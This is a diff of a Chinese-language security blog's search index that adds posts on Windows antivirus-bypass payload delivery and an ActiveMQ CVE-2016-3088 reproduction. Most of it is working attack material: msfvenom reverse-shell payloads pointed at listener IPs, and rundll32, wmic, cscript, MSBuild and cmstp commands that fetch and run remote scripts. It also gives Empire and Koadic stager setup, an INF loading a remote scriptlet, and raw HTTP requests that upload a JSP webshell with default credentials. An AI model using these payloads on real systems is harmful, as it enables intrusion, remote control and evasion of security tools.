+<h4 id="配合GreatSCT-1"><a href="#配合GreatSCT-1" class="headerlink" title="配合GreatSCT"></a>配合GreatSCT</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use Bypass</span><br><span class="line">use regsvr&#x2F;shellcode_iject&#x2F;base64_migrate.py</span><br><span class="line">generate</span><br></pre></td></tr></table></figure>
+<h3 id="rundll32方式"><a href="#rundll32方式" class="headerlink" title="rundll32方式"></a>rundll32方式</h3><h4 id="metaspolit模块-2"><a href="#metaspolit模块-2" class="headerlink" title="metaspolit模块"></a>metaspolit模块</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.107 lport&#x3D;1234 -f dll &gt; 1.dll</span><br><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_delivery</span><br><span class="line">rundll32.exe \\192.168.1.107\ZtmW\test.dll,0</span><br></pre></td></tr></table></figure>
+<h4 id="配合Koadic"><a href="#配合Koadic" class="headerlink" title="配合Koadic"></a>配合Koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use stager&#x2F;js&#x2F;rundll32_js</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<h3 id="SCT文件直接利用"><a href="#SCT文件直接利用" class="headerlink" title="SCT文件直接利用"></a>SCT文件直接利用</h3><h4 id="pubprn-vbs结合SCT文件利用"><a href="#pubprn-vbs结合SCT文件利用" class="headerlink" title="pubprn.vbs结合SCT文件利用"></a>pubprn.vbs结合SCT文件利用</h4><p>windows7下未成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cscript &#x2F;b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:http:&#x2F;&#x2F;10.100.18.20:8000&#x2F;1.sct</span><br></pre></td></tr></table></figure>
+<h4 id="配合empire-1"><a href="#配合empire-1" class="headerlink" title="配合empire"></a>配合empire</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listeners</span><br><span class="line">uselistener http</span><br><span class="line">set Host 192.168.1.109</span><br><span class="line">execute</span><br><span class="line">usestager windows&#x2F;launcher_sct</span><br><span class="line">set Listener HTTP</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+<h3 id="WMIC利用xsl方式"><a href="#WMIC利用xsl方式" class="headerlink" title="WMIC利用xsl方式"></a>WMIC利用xsl方式</h3><h4 id="配合koadic-1"><a href="#配合koadic-1" class="headerlink" title="配合koadic"></a>配合koadic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;zerosum0x0&#x2F;koadic</span><br><span class="line">use stager&#x2F;js&#x2F;wmic</span><br><span class="line">set SRVHOST 192.168.1.107</span><br><span class="line">run</span><br><span class="line">wmic os get &#x2F;FORMAT:&quot;http:&#x2F;&#x2F;192.168.1.109&#x2F;payload.xsl&quot;</span><br></pre></td></tr></table></figure>
+<h2 id="本地执行"><a href="#本地执行" class="headerlink" title="本地执行"></a>本地执行</h2><p>一般而言，本地执行的BypassAV的能力都比远程强，缺点就是文件落地难。</p>
+<h3 id="MSbuild-exe利用"><a href="#MSbuild-exe利用" class="headerlink" title="MSbuild.exe利用"></a>MSbuild.exe利用</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;45.76.107.177 lport&#x3D;6677 -f csharp</span><br><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe  exp.csproj  （改为XML格式也可）</span><br></pre></td></tr></table></figure>
+<h3 id="INF文件利用"><a href="#INF文件利用" class="headerlink" title="INF文件利用"></a>INF文件利用</h3><h4 id="配合cmstp-exe"><a href="#配合cmstp-exe" class="headerlink" title="配合cmstp.exe"></a>配合cmstp.exe</h4><p>依靠加载远程sct文件利用</p>
+<p>新建一个inf，在代码处填入恶意sct文件。</p>
+<p>然后运行cmstp.exe /s shell.inf</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[version]</span></span><br><span class="line"><span class="attr">Signature</span>=<span class="variable">$chicago</span>$</span><br><span class="line"><span class="attr">AdvancedINF</span>=<span class="number">2.5</span></span><br><span class="line"></span><br><span class="line"><span class="section">[DefaultInstall_SingleUser]</span></span><br><span class="line"><span class="attr">UnRegisterOCXs</span>=UnRegisterOCXSection</span><br><span class="line"></span><br><span class="line"><span class="section">[UnRegisterOCXSection]</span></span><br><span class="line">%11%\scrobj.dll,NI,https://gist.githubusercontent.com/NickTyrer/0604bb9d7bcfef9e0cf82c28a7b76f0f/raw/676451571c203303a95b95fcb29c8b7deb8a66e0/powersct.sct</span><br><span class="line"></span><br><span class="line"><span class="section">[Strings]</span></span><br><span class="line"><span class="attr">AppAct</span> = <span class="string">&quot;SOFTWARE\Microsoft\Connection Manager&quot;</span></span><br><span class="line"><span class="attr">ServiceName</span>=<span class="string">&quot;Yay&quot;</span></span><br><span class="line"><span class="attr">ShortSvcName</span>=<span class="string">&quot;Yay&quot;</span></span><br></pre></td></tr></table></figure>
+<h4 id="配合InfDefaultInstall-exe"><a href="#配合InfDefaultInstall-exe" class="headerlink" title="配合InfDefaultInstall.exe"></a>配合InfDefaultInstall.exe</h4><p>运行InfDefaultInstall.exe shady.inf</p>
+<h2 id="以上"><a href="#以上" class="headerlink" title="以上"></a>以上</h2>]]></content>
+      <categories>
+        <category>技巧</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -985,6 +967,59 @@ end</code></pre>
 <p>会返回应用名称，JVM，操作系统以及内核版本等信息。</p>
 <h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>apache-activemq-5.15.0 to apache-activemq-5.15.2apache-activemq-5.14.0 to apache-activemq-5.14.5</p>
 <h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p><img src="/images/(CVE-2017-15709)ActiveMQ%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+]]></content>
+      <categories>
+        <category>Poc</category>
+      </categories>
+      <tags>
+        <tag>ApacheMQ</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（CVE-2016-3088）ActiveMQ应用漏洞</title>
+    <url>/2021/01/12/%EF%BC%88CVE-2016-3088%EF%BC%89ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="（CVE-2016-3088）ActiveMQ应用漏洞"><a href="#（CVE-2016-3088）ActiveMQ应用漏洞" class="headerlink" title="（CVE-2016-3088）ActiveMQ应用漏洞"></a>（CVE-2016-3088）ActiveMQ应用漏洞</h1><a id="more"></a>
+
+<h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Apache ActiveMQ 5.x ~ 5.14.0</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>漏洞是需要登录之后才可以执行</p>
+<p>漏洞利用就是/fileserver/有put上传权限，/admin/有执行权限，可找到绝对路径，使用move移动文件到/admin/</p>
+<p>下面就是两步走，先是利用put上传文件到/fileserver/,然后移动到move到admin下面</p>
+<p>所有返回为204就代表是成功，有个坑点：不要put同文件名的文件上去</p>
+<p>如果上传不解析的话，则是证明没有权限！！！</p>
+<p>如果上传不解析的话，则是证明没有权限！！！</p>
+<p>如果上传不解析的话，则是证明没有权限！！！</p>
+<p>ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。</p>
+<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId24.png"></p>
+<pre><code>PUT /fileserver/shell.jsp HTTP/1.1
+Host: 192.168.197.25:8161
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Authorization: Basic YWRtaW46YWRtaW4=
+
+shell</code></pre>
+<p>利用 MOVE 方法将 Webshell 移入 admin/ 目录</p>
+<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId25.png"></p>
+<pre><code>Request Raw:
+MOVE /fileserver/shell.jsp HTTP/1.1
+Destination:file:/data/apache-activemq-5.7.0/webapps/admin/shell.jsp
+Host: 192.168.197.25:8161
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Authorization: Basic YWRtaW46YWRtaW4=
+Content-Length: 17
+Content-Length: 0
+
+shell</code></pre>
+<p><img src="./images/(CVE-2016-3088)ActiveMQ%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
 ]]></content>
       <categories>
         <category>Poc</category>
